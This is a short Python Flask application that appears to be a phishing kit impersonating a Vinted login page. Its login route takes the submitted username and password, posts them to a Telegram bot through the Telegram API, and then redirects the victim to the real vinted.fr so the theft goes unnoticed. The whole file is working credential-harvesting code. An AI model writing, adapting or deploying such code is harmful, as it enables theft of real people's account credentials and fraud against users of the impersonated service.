from flask import Flask, request, redirect, render_template
import os
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)


@app.route("/", methods=["GET"])
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Envoie à Telegram
    send_telegram_message(f"[Test Vinted Login] 👤 {username} | 🔑 {password}")

    # Redirige vers Vinted
    return redirect("https://www.vinted.fr")


if __name__ == "__main__":
    app.run(debug=True)
